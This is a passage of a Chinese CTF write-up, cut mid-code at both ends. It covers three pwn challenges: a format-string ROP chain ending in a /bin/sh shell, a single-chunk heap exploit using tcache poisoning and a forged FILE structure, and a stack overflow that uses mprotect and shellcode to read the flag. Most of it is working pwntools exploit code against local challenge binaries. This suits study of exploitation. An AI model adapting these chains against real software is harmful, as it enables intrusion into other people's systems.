class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span> + <span class=\"number\">0x8</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = elf_base + <span class=\"number\">0x50c0</span> <span class=\"comment\"># -&gt;&quot;/bin/sh&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span> + <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = libc_base + <span class=\"number\">0x000000000002a3e5</span>+<span class=\"number\">1</span> <span class=\"comment\"># ret</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_target = stack - <span class=\"number\">0x110</span> + <span class=\"number\">0x18</span></span><br><span class=\"line\">payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;stack_target % <span class=\"number\">0x10000</span>&#125;</span>c%23$hn&quot;</span>.encode()</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">write = libc_base + <span class=\"number\">0x50d60</span> <span class=\"comment\"># system</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    target = stack_target + i</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;target % <span class=\"number\">0x100</span>&#125;</span>c%23$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;%<span class=\"subst\">&#123;(write // (<span class=\"number\">0x100</span> ** i)) % (<span class=\"number\">0x100</span>)&#125;</span>c%53$hhn&quot;</span>.encode()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;content&gt; &quot;</span>, <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;cat flag&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2024changchengbei/image-20240331201257167.png\" alt=\"image-20240331201257167\"></p>\n<p>ps: 附录中有调试使用的dockerfile与docker-compose.yml</p>\n<h2 id=\"SomeTime\"><a href=\"#SomeTime\" class=\"headerlink\" title=\"SomeTime\"></a>SomeTime</h2><p>本题是单个堆块的堆风水题目，是一个你与some从恶魔手中夺取flag的合作历险故事</p>\n<p>漏洞点在</p>\n<p>SIGALARM的信号处理函数watch中</p>\n<p><img src=\"/p/2024changchengbei/image-20240331201819825.png\" alt=\"image-20240331201819825\"></p>\n<p>这里会将now指针中的低位字节清零，剧情中，some在最后时刻能为你做到最后的事情。\t</p>\n<p>信号注册在init函数中</p>\n<p>思路也比较简单只需要利用tcachebin机制，<strong>把tcachebin当作以前pwn可以保存多个堆块的题目的堆块数组即可</strong></p>\n<p>为了做到上述内容，我们要保证每次申请释放的size大小不同，即可在tcachebin中只存在一个堆块</p>\n<p>由于我们可以将申请出来的指针做低字节的修改，所以我们可以很方便的构造堆叠，修改tcachebin的size位使得size变大，扩大溢出范围，之后我们可以通过重复申请tcachebin内容的堆块，泄露地址，最后完成fd修改，最后houseofapple一把梭</p>\n<h3 id=\"关于堆风水\"><a href=\"#关于堆风水\" class=\"headerlink\" title=\"关于堆风水\"></a>关于堆风水</h3><p>这道一题目，我们需要尽量申请时候使用不同的size，否则将会申请出相同地址的堆块，或者这里可以多次add，使得申请多个无指针引用内存，使得内存地址扩展，之后篡改size顶部tcachebin，size位置，使得刚好大小超过0x420并能完美覆盖中间tcache，衔接上后方伪造的size，使得此时free后能进入unsortedbin，从而可以泄露main_arena地址，使得泄露libc地址。</p>\n<p>之后就是修改tcachebin的count使得大于1，这里就要一些堆风水的技巧，一种可行的思路是，我们构造一种堆叠，<strong>使得一个大的tcachebin堆块覆盖两个及其以上的堆块</strong>，这样我们就可以同时操控chunk1和chunk2的内容，控制这两个size设置为相同的即可</p>\n<p>（注意由于本题目只能拿到一个堆块做操作，也就是修改fakechunk的时候chunk1与2是在tcachebin中的，tacachebin中并不检查malloc取出的堆块大小是否正确，同时这里修改chunk2时候，注意恢复chunk1的fd和key字段）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">| ---------- fake chunk -------------------|</span><br><span class=\"line\">...-| --- chunk1 --- | --- chunk2 --- | -...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><p>PS：由于本题做了大量的sleep操作，这里在本地调试的时候需要patch掉sleep的时间，使得调试变快</p>\n<p>在程序最后需要等待时间到达，系统自动调用exit退出即可获得shell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(b&quot;./sometime&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;(1:add,2:release,3:print)&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;size&gt; &quot;</span>, tob(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;note&gt; &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;(1:add,2:release,3:print)&gt; &quot;</span>, <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;(1:add,2:release,3:print)&gt; &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;exp running ...&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0xa0</span>-<span class=\"number\">0x10</span>, <span class=\"number\">0xf0</span>, <span class=\"number\">0x10</span>): </span><br><span class=\"line\">    add(i, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">    free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x30</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x5e1</span>) + <span class=\"string\">b&quot;114514&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;I can only assist up to this point. Sorry.&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">leak = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base = leak - <span class=\"number\">0x21a10a</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base: <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>, checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x78</span>) + <span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">heap_addr = u64(io.recv(<span class=\"number\">5</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_addr: <span class=\"subst\">&#123;heap_addr:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x80</span>) + <span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;deadbeaf&quot;</span>)</span><br><span class=\"line\">key = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;key: <span class=\"subst\">&#123;key:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x70</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x51</span>) + p64(heap_addr &gt;&gt; <span class=\"number\">12</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x80</span>: heap_addr &gt;&gt; <span class=\"number\">12</span>,</span><br><span class=\"line\">    <span class=\"number\">0x88</span>: key,</span><br><span class=\"line\">    <span class=\"number\">0xc8</span>: <span class=\"number\">0x31</span></span><br><span class=\"line\">&#125;))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x78</span>: <span class=\"number\">0x31</span>,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>: heap_addr &gt;&gt; <span class=\"number\">12</span>,</span><br><span class=\"line\">    <span class=\"number\">0x88</span>: key,</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x78</span>: <span class=\"number\">0x51</span>,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>: (libc.symbols[<span class=\"string\">&quot;_IO_list_all&quot;</span>]) ^ (heap_addr &gt;&gt; <span class=\"number\">12</span>),</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">fake_file_addr = heap_addr + <span class=\"number\">0x7f0</span></span><br><span class=\"line\"><span class=\"comment\"># ref: https://blog.csome.cc/p/houseofminho-wp/</span></span><br><span class=\"line\">add(<span class=\"number\">0xe0</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x0</span>: <span class=\"string\">b&quot;  sh;&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>],</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: fake_file_addr-<span class=\"number\">0x10</span>, <span class=\"comment\"># wide data</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: fake_file_addr+<span class=\"number\">0x100</span>, <span class=\"comment\"># 可写，且内存为0即可</span></span><br><span class=\"line\">    <span class=\"number\">0xD0</span>: fake_file_addr+<span class=\"number\">0x28</span>-<span class=\"number\">0x68</span>, <span class=\"comment\"># wide data vtable</span></span><br><span class=\"line\">    <span class=\"number\">0xD8</span>: libc.symbols[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>], <span class=\"comment\"># vtable  </span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, p64(fake_file_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2024changchengbei/image-20240331204105421.png\" alt=\"image-20240331204105421\"></p>\n<p>ps: 附录中有调试使用的dockerfile与docker-compose.yml</p>\n<h2 id=\"shutup\"><a href=\"#shutup\" class=\"headerlink\" title=\"shutup\"></a>shutup</h2><p>此题没有输出，单纯只有输入，没有开PIE，没有开canary，漏洞就是栈溢出</p>\n<p><img src=\"/p/2024changchengbei/image-20240401042955524.png\" alt=\"image-20240401042955524\"></p>\n<p>但是这里难点是如何泄露，或者如何构造出libc的任意地址，很明显，这里不给我们第二次的输入机会</p>\n<p>需要注意到，题目给了一个没有调用的函数，可以从数组中取出数据，这里可以利用数组下标负数溢出，使得取出got表中read地址</p>\n<p><img src=\"/p/2024changchengbei/image-20240401043039760.png\" alt=\"image-20240401043039760\"></p>\n<p><img src=\"/p/2024changchengbei/image-20240401043048348.png\" alt=\"image-20240401043048348\"></p>\n<p>获得了read地址还不足以能够做到取出libc任意地址，但是如果这里的<code>qword_601060 += atoi(nptr);</code>逻辑就很巧妙，如果我们能够按照下面的方法控制执行流，那么我们就能将read内容存入qword_601060中，之后我们利用rop，在bss上布置一个数字，并使用<code>pop_rdi; ret 0x000400703</code>的手法，就能在qword_601060中构造出read+offset，我们也就能获得syscall</p>\n<p><img src=\"/p/2024changchengbei/image-20240401043318111.png\" alt=\"image-20240401043318111\"></p>\n<h3 id=\"任意地址写原语\"><a href=\"#任意地址写原语\" class=\"headerlink\" title=\"任意地址写原语\"></a>任意地址写原语</h3><p>在进入栈溢出函数的开始，我们只能写入0x40个字节，很明显，这是不够的，我们需要找到一种方法，能够任意地址写，并能支持写入多个字符。</p>\n<p>答案是：依然还是函数sub_4006B7，我们再次审视下面的函数汇编，会发现，edi的数值会写入[rbp-4]的位置，而rbp我们可以通过pop rbp的rop控制</p>\n<p><img src=\"/p/2024changchengbei/image-20240401043048348.png\" alt=\"image-20240401043048348\"></p>\n<p>我们很轻松的就能构造如下的原语</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">    pop_rbp, <span class=\"number\">4</span> + addr,</span><br><span class=\"line\">    pop_rdi, <span class=\"number\">0xde</span>,</span><br><span class=\"line\">    <span class=\"number\">0x0004006BB</span>, rbp,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>这就能向addr中写入0xde字节，为什么我们只能写入一个字节呢？因为edi的数值后续会作为数组的索引，数字太大会导致索引到不可读的内存，导致段错误，所以为了保险起见，这里我们每次只写入1个字节</p>\n<p>最后我们就能构造任意地址写的payload构造函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">make_bytes</span>(<span class=\"params\">addr, bbb</span>):</span><br><span class=\"line\">    target = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(bbb)):</span><br><span class=\"line\">        tmp = bbb[i]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> tmp == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        template = [</span><br><span class=\"line\">            pop_rbp, <span class=\"number\">4</span> + addr + i,</span><br><span class=\"line\">            pop_rdi, tmp,</span><br><span class=\"line\">            <span class=\"number\">0x0004006BB</span>, base,</span><br><span class=\"line\">        ]</span><br><span class=\"line\">        target.extend(template)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> target</span><br></pre></td></tr></table></figure>\n\n<p>接下来的内容就比较简单，控制rdi、rsi、rdx之后调用mprotect修改bss的可执行权限，写入shellcode即可</p>\n<p>但是rdx的控制这里利用了，这个部分，控制r12、rbx内容使得call的内容刚好是pop rbp，将call在栈上写入的地址pop掉即可</p>\n<p><img src=\"/p/2024changchengbei/image-20240401044525680.png\" alt=\"image-20240401044525680\"></p>\n<h3 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(</span><br><span class=\"line\"><span class=\"string\">f&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">mov rax, <span class=\"subst\">&#123;u64((<span class=\"string\">b&quot;./flag&quot;</span> + <span class=\"built_in\">bytearray</span>([<span class=\"number\">0</span>]*<span class=\"number\">8</span>))[:<span class=\"number\">8</span>])&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">push rax</span></span><br><span class=\"line\"><span class=\"string\">mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, 0</span></span><br><span class=\"line\"><span 